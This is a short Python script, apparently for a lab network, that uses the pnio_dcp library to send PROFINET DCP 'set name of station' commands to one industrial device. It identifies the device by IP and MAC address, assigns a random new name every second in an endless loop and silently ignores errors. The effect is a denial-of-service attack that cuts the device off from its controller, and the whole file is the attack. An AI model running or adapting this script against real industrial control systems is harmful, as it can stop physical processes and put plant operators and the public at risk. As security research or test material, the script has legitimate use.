import pnio_dcp
from time import sleep
import random,string
ip = "172.16.238.12"
dcp = pnio_dcp.DCP(ip)

mac_address = "8a:ca:58:b9:e9:51"


while True:
	try:
		new_name = ''.join((random.choice(string.ascii_lowercase) for x in range(7)))
		dcp.set_name_of_station(mac_address, new_name)
		sleep(1)
	except:
		pass

